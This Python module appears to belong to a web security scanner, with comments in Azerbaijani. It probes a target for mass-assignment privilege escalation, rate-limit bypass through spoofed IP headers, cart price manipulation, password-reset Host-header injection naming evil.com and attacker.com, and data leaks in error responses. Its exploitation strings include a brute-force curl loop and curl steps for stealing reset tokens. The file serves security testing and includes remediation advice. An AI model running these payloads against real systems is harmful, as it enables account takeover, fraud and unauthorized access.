"""
Business Logic & Authenticated Scan Checks
- Privilege Escalation
- Mass Assignment
- Price/Quantity Manipulation
- Account Takeover vectors
- IDOR with auth context
- Rate limit bypass on auth endpoints
"""

import asyncio
import json
import re
from urllib.parse import urlparse, urljoin
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()


class BusinessLogicScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    async def _check_privilege_escalation(
        self, base_url: str
    ) -> list[Vulnerability]:
        """
        Admin/role parametrləri ilə privilege escalation cəhdi
        """
        vulns = []

        # Ümumi admin endpoint-lər
        admin_paths = [
            "/api/user/update", "/api/profile/update",
            "/api/users/me", "/api/account/update",
            "/user/settings", "/profile/edit",
            "/api/v1/user", "/api/v2/user",
        ]

        # Mass assignment payloadları
        privesc_payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"admin": True},
            {"role": "administrator"},
            {"user_type": "admin"},
            {"permissions": ["admin", "superuser"]},
            {"access_level": 0},
            {"privilege": "root"},
            {"group": "admin"},
        ]

        for path in admin_paths:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            for payload in privesc_payloads[:3]:
                resp = await self.http_client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue

                # 200 OK + response-da admin görsənərsə
                if resp.status_code == 200:
                    body = resp.text.lower()
                    if any(
                        kw in body
                        for kw in ["admin", "true", "role", "privilege", "permission"]
                    ):
                        vulns.append(Vulnerability(
                            vuln_type="Business Logic",
                            url=url,
                            severity=Severity.CRITICAL,
                            cvss_score=9.8,
                            title=f"Mass Assignment / Privilege Escalation — {path}",
                            description=(
                                f"POST {path} endpoint-i istifadəçinin öz "
                                f"role/permission-unu dəyişməsinə imkan verir. "
                                f"Payload: {json.dumps(payload)}"
                            ),
                            evidence=(
                                f"POST {url}\n"
                                f"Body: {json.dumps(payload)}\n"
                                f"Response: {resp.status_code} — {resp.text[:200]}"
                            ),
                            exploitation=(
                                f"curl -X POST '{url}' \\\n"
                                f"  -H 'Content-Type: application/json' \\\n"
                                f"  -H 'Cookie: YOUR_SESSION' \\\n"
                                f"  -d '{json.dumps(payload)}'\n\n"
                                f"Sonra /api/users/me ilə rol dəyişdi mi yoxla"
                            ),
                            remediation=(
                                "1. Server-side whitelist — yalnız icazəli sahələri qəbul et\n"
                                "2. Role/permission-u heç vaxt client-dən qəbul etmə\n"
                                "3. Mass assignment protection (Laravel: $guarded, Rails: strong params)\n"
                                "4. DTO pattern istifadə et"
                            ),
                            curl_poc=(
                                f"curl -X POST '{url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{json.dumps(payload)}'"
                            ),
                            cwe_id="CWE-915",
                        ))
                        break

        return vulns

    async def _check_rate_limit_bypass(
        self, base_url: str
    ) -> list[Vulnerability]:
        """Auth endpoint-lərindəki rate limit bypass yoxla"""
        vulns = []

        auth_endpoints = [
            ("/api/auth/login", {"email": "test@test.com", "password": "test"}),
            ("/login", {"username": "admin", "password": "test"}),
            ("/api/forgot-password", {"email": "test@test.com"}),
            ("/api/verify-otp", {"otp": "000000"}),
            ("/api/reset-password", {"token": "test", "password": "test"}),
        ]

        bypass_headers = [
            {"X-Forwarded-For": "1.2.3.{}"},
            {"X-Real-IP": "10.0.0.{}"},
            {"CF-Connecting-IP": "192.168.1.{}"},
            {"True-Client-IP": "172.16.0.{}"},
        ]

        for path, payload in auth_endpoints:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            # Normal 5 request — rate limit var mı?
            blocked = False
            for i in range(5):
                resp = await self.http_client.post(url, json=payload)
                if resp and resp.status_code == 429:
                    blocked = True
                    break
                await asyncio.sleep(0.1)

            if not blocked:
                continue  # Rate limit yoxdur — bypass lazım deyil

            # Rate limit var — bypass cəhdi
            for header_template in bypass_headers:
                header_key = list(header_template.keys())[0]
                bypassed = False

                for i in range(5):
                    header_val = list(header_template.values())[0].format(i + 10)
                    resp = await self.http_client.post(
                        url,
                        json=payload,
                        headers={header_key: header_val},
                    )
                    if resp and resp.status_code != 429:
                        bypassed = True
                    await asyncio.sleep(0.1)

                if bypassed:
                    vulns.append(Vulnerability(
                        vuln_type="Business Logic",
                        url=url,
                        severity=Severity.HIGH,
                        cvss_score=7.5,
                        title=f"Rate Limit Bypass — {header_key} — {path}",
                        description=(
                            f"{path} endpoint-ində rate limit var, "
                            f"lakin '{header_key}' header-i dəyişdirərək bypass mümkündür. "
                            f"Brute force hücumuna imkan yaranır."
                        ),
                        evidence=(
                            f"Normal 5 req → 429 alındı\n"
                            f"{header_key} ilə 5 req → bypass işlədi"
                        ),
                        exploitation=(
                            f"# Hydra ilə brute force:\n"
                            f"for i in $(seq 1 1000); do\n"
                            f"  curl -X POST '{url}' \\\n"
                            f"    -H '{header_key}: 1.2.3.$i' \\\n"
                            f"    -H 'Content-Type: application/json' \\\n"
                            f"    -d '{{\"email\":\"victim@target.com\","
                            f"\"password\":\"WORDLIST_ENTRY\"}}'\n"
                            f"done"
                        ),
                        remediation=(
                            "1. Rate limit-i IP əvəzinə user/account əsasında tətbiq et\n"
                            "2. Proxy header-lərini trust etmə\n"
                            "3. X-Forwarded-For-u yalnız trusted proxy-dən qəbul et\n"
                            "4. CAPTCHA əlavə et\n"
                            "5. Account lockout tətbiq et"
                        ),
                        curl_poc=(
                            f"curl -X POST '{url}' "
                            f"-H '{header_key}: 1.2.3.100' "
                            f"-H 'Content-Type: application/json' "
                            f"-d '{json.dumps(payload)}'"
                        ),
                        cwe_id="CWE-307",
                    ))
                    break

        return vulns

    async def _check_price_manipulation(
        self, base_url: str
    ) -> list[Vulnerability]:
        """Price/quantity manipulation — e-commerce logic"""
        vulns = []

        cart_endpoints = [
            "/api/cart/add",
            "/api/cart/update",
            "/cart/item",
            "/api/order/create",
            "/shop/cart",
        ]

        # Mənfi/sıfır qiymət/miqdar
        manipulation_payloads = [
            {"quantity": -1, "price": 1},
            {"quantity": 0, "price": 0},
            {"amount": -100},
            {"price": 0.001},
            {"quantity": 9999999},
            {"discount": 100},
            {"coupon_value": 9999},
        ]

        for path in cart_endpoints:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            for payload in manipulation_payloads:
                resp = await self.http_client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue

                if resp.status_code == 200:
                    body = resp.text.lower()
                    # Uğur əlaməti — error yoxdur
                    if not any(
                        err in body
                        for err in ["error", "invalid", "failed", "rejected", "bad request"]
                    ):
                        vulns.append(Vulnerability(
                            vuln_type="Business Logic",
                            url=url,
                            severity=Severity.HIGH,
                            cvss_score=8.5,
                            title=f"Price/Quantity Manipulation — {path}",
                            description=(
                                f"{path} endpoint-i mənfi/sıfır/böyük "
                                f"dəyərləri validate etmir. "
                                f"Pulsuz və ya ucuz alış-veriş mümkün ola bilər."
                            ),
                            evidence=(
                                f"POST {url}\n"
                                f"Payload: {json.dumps(payload)}\n"
                                f"Response: 200 OK, error yoxdur"
                            ),
                            exploitation=(
                                f"1. Səbətə məhsul əlavə et\n"
                                f"2. Bu request-i göndər:\n"
                                f"curl -X POST '{url}' \\\n"
                                f"  -H 'Cookie: YOUR_SESSION' \\\n"
                                f"  -H 'Content-Type: application/json' \\\n"
                                f"  -d '{json.dumps(payload)}'\n"
                                f"3. Checkout prosesini tamamla"
                            ),
                            remediation=(
                                "1. Server-side validation — qiymət/miqdar mənfi ola bilməz\n"
                                "2. Qiyməti client-dən qəbul etmə — DB-dən götür\n"
                                "3. Min/max limit tətbiq et\n"
                                "4. Checkout-da yenidən qiymət hesabla"
                            ),
                            curl_poc=(
                                f"curl -X POST '{url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{json.dumps(payload)}'"
                            ),
                            cwe_id="CWE-840",
                        ))
                        break

        return vulns

    async def _check_account_takeover_vectors(
        self, base_url: str
    ) -> list[Vulnerability]:
        """Account takeover vektorlarını yoxla"""
        vulns = []

        # Password reset endpoint analizi
        reset_paths = [
            "/api/forgot-password",
            "/api/reset-password",
            "/forgot-password",
            "/account/reset",
        ]

        for path in reset_paths:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            # Host header injection cəhdi
            resp = await self.http_client.post(
                url,
                json={"email": "test@test.com"},
                headers={
                    "Host": "evil.com",
                    "Content-Type": "application/json",
                },
            )
            if resp and resp.status_code in [200, 201]:
                vulns.append(Vulnerability(
                    vuln_type="Business Logic",
                    url=url,
                    severity=Severity.HIGH,
                    cvss_score=8.0,
                    title=f"Password Reset — Host Header Injection Potensialı — {path}",
                    description=(
                        f"Password reset endpoint-i Host header-ə görə "
                        f"reset link yaradırsa, attacker öz domain-inə "
                        f"reset token-i yönləndirə bilər."
                    ),
                    evidence=(
                        f"POST {url}\n"
                        f"Host: evil.com\n"
                        f"Response: {resp.status_code}"
                    ),
                    exploitation=(
                        f"1. Victim-in emailini bil\n"
                        f"2. Bu request-i göndər:\n"
                        f"curl -X POST '{url}' \\\n"
                        f"  -H 'Host: attacker.com' \\\n"
                        f"  -H 'Content-Type: application/json' \\\n"
                        f"  -d '{{\"email\":\"victim@target.com\"}}'\n"
                        f"3. Reset email-i attacker.com domain-inə göndərilər\n"
                        f"4. Token-i al, şifrəni dəyiş"
                    ),
                    remediation=(
                        "1. Reset URL-i config-dən al — Host header-dən deyil\n"
                        "2. Allowed host whitelist tətbiq et\n"
                        "3. Django: ALLOWED_HOSTS, Rails: config.hosts"
                    ),
                    curl_poc=(
                        f"curl -X POST '{url}' "
                        f"-H 'Host: evil.com' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"email\":\"victim@target.com\"}}'"
                    ),
                    cwe_id="CWE-640",
                ))

        return vulns

    async def _check_response_manipulation(
        self, base_url: str
    ) -> list[Vulnerability]:
        """
        Response-based auth bypass — false/true dəyişdirmə
        """
        vulns = []

        # Bu yoxlama manual Burp Suite ilə daha effektivdir
        # Avtomatik aşkar etmək üçün hint verək

        check_paths = [
            "/api/admin", "/api/admin/users",
            "/api/users/all", "/admin/dashboard",
        ]

        for path in check_paths:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
            resp = await self.http_client.get(url)

            if not resp:
                continue

            # 401/403 qaytarır amma JSON body-si admin datası var?
            if resp.status_code in [401, 403]:
                try:
                    data = resp.json()
                    body_str = str(data).lower()
                    if any(
                        kw in body_str
                        for kw in ["users", "email", "admin", "password", "token"]
                    ):
                        vulns.append(Vulnerability(
                            vuln_type="Business Logic",
                            url=url,
                            severity=Severity.HIGH,
                            cvss_score=7.5,
                            title=f"Data Leak in Error Response — {path}",
                            description=(
                                f"Endpoint {resp.status_code} qaytarır "
                                f"lakin response body-sində həssas məlumat var. "
                                f"Authorization yalnız UI-da tətbiq olunub."
                            ),
                            evidence=(
                                f"HTTP {resp.status_code}\n"
                                f"Body: {str(data)[:300]}"
                            ),
                            exploitation=(
                                f"curl -s '{url}' — "
                                f"{resp.status_code} olsa da data görünür.\n"
                                f"Burp Suite ilə intercept edib status 200-ə dəyiş."
                            ),
                            remediation=(
                                "1. Server-side authorization — yalnız frontend-də etmə\n"
                                "2. Error response-da data return etmə\n"
                                "3. Middleware-lə bütün endpoint-ləri qoru"
                            ),
                            curl_poc=f"curl -s '{url}'",
                            cwe_id="CWE-284",
                        ))
                except Exception:
                    pass

        return vulns

    async def scan(self, base_url: str) -> list[Vulnerability]:
        console.print(
            f"\n[bold cyan]🧠 Business Logic scan:[/bold cyan] {base_url[:60]}"
        )
        vulns = []

        tasks = [
            self._check_privilege_escalation(base_url),
            self._check_rate_limit_bypass(base_url),
            self._check_price_manipulation(base_url),
            self._check_account_takeover_vectors(base_url),
            self._check_response_manipulation(base_url),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            if isinstance(r, list):
                vulns.extend(r)
                for v in r:
                    console.print(
                        f"  {v.severity.emoji} "
                        f"[bold]Business Logic:[/bold] {v.title}"
                    )

        return vulns